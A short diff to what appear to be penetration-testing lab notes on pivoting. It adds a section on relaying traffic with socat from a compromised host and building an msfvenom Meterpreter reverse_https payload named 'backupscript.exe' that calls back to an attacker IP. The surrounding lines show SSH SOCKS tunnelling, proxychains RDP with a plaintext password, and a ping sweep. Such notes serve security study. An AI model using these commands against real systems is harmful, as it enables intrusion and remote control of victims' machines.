@@ -117,5 +117,15 @@ ssh -D 9050 alreadyCompromisedMachine@10.129.202.64
     search rdp_scanner
     proxychains xfreerdp /v:172.16.5.19 /u:admin /p:pass@123
 ```
+ ##### 
+ * When SSH is not available use SOCAT
+   ```
+   Victim IP: 172.16.5.129
+   Attacker IP: 10.10.14.18
+   victim@compromisedhost:~$ socat TCP4-LISTEN:8080,fork TCP4:10.10.14.18:80
+   attacker/machine$ msfvenom -p windows/x64/meterpreter/reverse_https LHOST=172.16.5.129 -f exe -o backupscript.exe LPORT=8080
+   Running the backupscript.exe on victim machine would connect to the attacker machine
+   ```
+   
 #### Linux Ping Sweep:
 ```for i in {1..254} ;do (ping -c 1 172.16.5.$i | grep "bytes from" &) ;done```
